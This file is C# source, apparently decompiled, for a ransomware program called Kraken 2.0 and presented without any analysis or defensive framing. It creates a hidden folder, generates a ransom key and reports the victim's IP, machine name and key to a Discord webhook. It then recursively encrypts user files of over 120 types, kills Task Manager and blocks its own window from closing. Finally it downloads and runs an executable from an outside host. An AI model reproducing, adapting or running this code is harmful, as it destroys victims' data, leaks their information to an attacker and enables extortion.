using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Kraken_2._0;

public class Infector : Form
{
	private string UserCancer = "C:\\Users\\";

	private string Usermeme = Environment.UserName;

	public string RKey = "";

	private static Random random = new Random();

	private bool kek = false;

	private IContainer components = null;

	private Timer timer1;

	private Timer timer2;

	public Infector()
	{
		InitializeComponent();
		if (!Directory.Exists("C:\\$WinTMP"))
		{
			DirectoryInfo directoryInfo = Directory.CreateDirectory("C:\\$WinTMP");
			directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
		}
		if (!File.Exists("C:\\$WinTMP\\Files"))
		{
			FileStream fileStream = File.Create("C:\\$WinTMP\\Files");
			fileStream.Close();
			File.WriteAllText("C:\\$WinTMP\\Files", "");
		}
	}

	public static string RansomPass(int length)
	{
		return new string((from s in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyz,./?><;:'[*]{}|+=_-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	public static string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	private void Infector_Load(object sender, EventArgs e)
	{
		File.Move(Assembly.GetEntryAssembly()!.Location, "C:\\$WinTMP\\" + RandomString(200) + ".exe");
		RKey = RansomPass(25);
		FileStream fileStream = File.Create("C:\\$WinTMP\\Logs.Win");
		fileStream.Close();
		File.WriteAllText("C:\\$WinTMP\\Logs.Win", RKey);
		try
		{
			using MGR mGR = new MGR();
			mGR.ProfilePicture = "https://cdn.discordapp.com/attachments/436977402200195082/436977700499095552/Animated_GIF-downsized_large.gif";
			mGR.UserName = string.Format("{0}", new WebClient().DownloadString("http://psn.eztag.xyz/ip.php"));
			mGR.WebHook = "https://discordapp.com/api/webhooks/436977414632112130/LZZ9-xB71B9_9xrfLZvrw85CSc3hVq_28At9U_SzqhmKU2493xm5H1A5BcMYguCvdQ6K";
			mGR.SendMessage(string.Format("New victim. IP => `{0}` Computer name => `{1}` Ransom key => `{2}`", new WebClient().DownloadString("http://psn.eztag.xyz/ip.php"), Environment.MachineName, RKey));
		}
		catch
		{
		}
		EDir(UserCancer + Usermeme, RKey);
		EDir(UserCancer, RKey);
		EDir(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), RKey);
		new WebClient().DownloadFile("http://psn.eztag.xyz/Kr4kenDecrypt.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Kr4kenDecrypt.exe");
		Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Kr4kenDecrypt.exe");
		kek = true;
		Application.Exit();
	}

	public void EDir(string location, string password)
	{
		try
		{
			string[] source = new string[122]
			{
				".txt", ".exe", ".zip", ".iso", ".msi", ".gif", ".jpg", ".png", ".cs", ".h",
				".rar", ".7zip", ".tar.gz", ".7z", ".bat", ".bin", ".sql", ".ttf", ".docx", ".jpeg",
				".odt", ".mp3", ".wav", ".deb", ".ogg", ".obj", ".object", ".dat", ".xml", ".vb",
				".ps", ".psd", ".asp", ".aspx", ".tif", ".tiff", ".otf", ".jar", ".py", ".python",
				".z", ".xml", ".ico", ".ai", ".bmp", ".svg", ".js", ".cer", ".htm", ".html",
				".css", ".php", ".c", ".class", ".go", ".swift", ".mpeg", ".mpg", ".avi", ".ppt",
				".pptx", ".0", ".1st", ".600", ".602", ".602", ".abw", ".acl", ".log", ".ttf",
				".udo", ".tdf", ".fnt", ".asc", ".tab", ".md2", ".md3", ".md4", ".md5", ".pov",
				".x", ".w3d", ".odf", ".a", ".jar", ".war", ".pdf", ".dvi", ".xsl-fo", ".xps",
				".ps", ".ps.gz", ".sti", ".ppt", ".pps", ".pot", ".pez", ".odp", ".silo", ".fits",
				".cbf", ".ebf", ".cbfx", ".ebfx", ".ahk", ".as", ".bas", ".lua", ".nuc", ".nut",
				".php?", ".pl", ".pm", ".psc", ".psm1", ".rb", ".sdl", ".xpl", ".ebuild", ".contact",
				".mp4", ".wmv"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				try
				{
					EDir(directories[j], password);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public byte[] AES(byte[] bytesToBeMemed, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeMemed, 0, bytesToBeMemed.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void EFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeMemed = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = AES(bytesToBeMemed, bytes);
			File.WriteAllBytes(file, bytes2);
			File.AppendAllText("C:\\$WinTMP\\Files", file + Environment.NewLine);
		}
		catch
		{
		}
	}

	private void Infector_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!kek)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
		else
		{
			Application.Exit();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			Process.GetProcessesByName("TaskMGR")[0].Kill();
		}
		catch
		{
		}
		try
		{
			Process.GetProcessesByName("TaskManager")[0].Kill();
		}
		catch
		{
		}
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Enabled(true);
		timer1.set_Interval(1);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.set_Enabled(true);
		timer2.set_Interval(1);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Infector");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Infector_FormClosing));
		((Form)this).add_Load((EventHandler)Infector_Load);
		((Control)this).ResumeLayout(false);
	}
}
